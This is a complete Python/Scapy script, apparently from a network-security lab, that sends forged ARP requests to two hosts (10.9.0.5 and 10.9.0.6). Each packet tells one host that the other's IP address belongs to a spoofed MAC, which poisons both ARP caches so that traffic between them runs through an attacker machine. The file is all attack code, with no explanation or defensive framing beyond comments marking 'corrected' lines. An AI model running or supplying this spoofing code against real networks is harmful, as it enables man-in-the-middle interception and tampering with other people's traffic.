#!/usr/bin/env python3
from scapy.all import *

target_IP1 = "10.9.0.5"
target_MAC1 = "02:42:0a:09:00:05"

fake_IP1 = "10.9.0.6"
fake_MAC = "02:42:0a:09:00:69"


target_IP2 = "10.9.0.6"
target_MAC2 = "02:42:0a:09:00:06"

fake_IP2 = "10.9.0.5"
fake_MAC = "02:42:0a:09:00:69"


ether1 = Ether(dst=target_MAC1, src=fake_MAC)  # Corrected this line
arp1 = ARP(hwsrc=fake_MAC, psrc=fake_IP1, pdst=target_IP1, op=1)  # Corrected op field

pkt1 = ether1/arp1

ether2 = Ether(dst=target_MAC2, src=fake_MAC)  # Corrected this line
arp2 = ARP(hwsrc=fake_MAC, psrc=fake_IP2, pdst=target_IP2, op=1)  # Corrected op field

pkt2 = ether2/arp2

sendp(pkt1)
sendp(pkt2)